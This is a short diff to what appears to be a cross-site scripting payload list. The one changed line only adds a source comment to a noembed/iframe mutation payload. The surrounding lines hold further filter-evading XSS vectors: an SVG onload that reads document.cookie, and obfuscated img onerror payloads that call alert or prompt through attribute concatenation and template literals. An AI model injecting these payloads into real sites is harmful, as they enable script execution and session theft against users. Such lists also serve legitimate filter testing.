@@ -98,7 +98,7 @@ content['alert'](6)
  
  
  
-  xsschop: <noembed><img src="<noembed><iframe> onload=alert(1)" /></noembed>
+  xsschop: <noembed><img src="<noembed><iframe> onload=alert(1)" /></noembed> /*payload from Google XSS*/
  <svg src=? onload="a(this);function a()(alert(document.cookie))">
  <img  alt=al lang=ert  src=? onerror=top[alt%2blang]`0`>
  <img src=?  onerror=_=prompt,_`?` >
